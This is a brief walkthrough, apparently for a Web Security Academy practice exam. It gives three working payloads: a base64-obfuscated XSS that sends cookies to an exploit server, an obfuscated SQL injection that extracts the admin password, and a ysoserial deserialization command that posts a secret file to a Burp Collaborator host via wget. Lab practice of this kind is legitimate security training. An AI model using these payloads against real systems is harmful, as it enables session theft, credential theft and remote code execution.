@@ -1,0 +1,29 @@
+Note: the parameter name's aren't the same, so each time you try to pass the practice exam you get different parameters. 
+ 
+- First part:
+ 
+In the main page there is an XSS in the search box, to reproduce that search for any value in that box and change the url and the parameter 'searchterm' with yours, after that decode the base64 value and change it to your exploit server.
+ 
+The payload:
+<script>document.location='https://CHANGETHIS.web-security-academy.net/?searchterm=%5C%5C"-eval(atob(\'ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZXhwbG9pdC1DSEFOR0VUSElTLndlYi1zZWN1cml0eS1hY2FkZW15Lm5ldC8/Yz0nK2RvY3VtZW50LmNvb2tpZQ\'))}%2F%2F'</script>
+ 
+Now copy your new payload and send it to the victim (this option can be found in the exploit server and the link is in the top of page of your webapp)
+ 
+- Second part:
+ 
+Go to advanced search and search for anything, we have a sql injection in the second parameter 'organizeBy', 'SortBy' or 'organize-by' depends on your webapp.
+ 
+Payload:
+ 
+https://CHANGETHIS.web-security-academy.net/search-advanced?find=&organize-by=(CAsT((CHr(113)||CHr(98)||CHr(120)||CHr(106)||CHr(113))||(SElECT/**/coAlESce(CAsT(password/**/As/**/varCHar(10000))::text,(CHr(32)))/**/fRoM/**/public.users/**/ORdEr/**/bY/**/password/**/OffSET/**/1/**/lImit/**/1)::text||(CHr(113)||CHr(122)||CHr(98)||CHr(98)||CHr(113))/**/As/**/nUmeric))&author=
+ 
+Administrator password regex: qbxjq(.*?)qzbbq
+ 
+- Third part:
+ 
+After you login using the administrator credentials, go to the admin panel and you will have a new set session that has a weird base64 value, we have a java deserialization and you can easily run the payload below and change that cookie value and you will get the flag.
+ 
+Download the version: ysoserial-master-8eb5cbfbf6-1.jar
+ 
+[code]
+java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections5 "wget --post-file /home/carlos/secret XXXXXXXXX.burpcollaborator.net" | gzip -f | base64 -w0
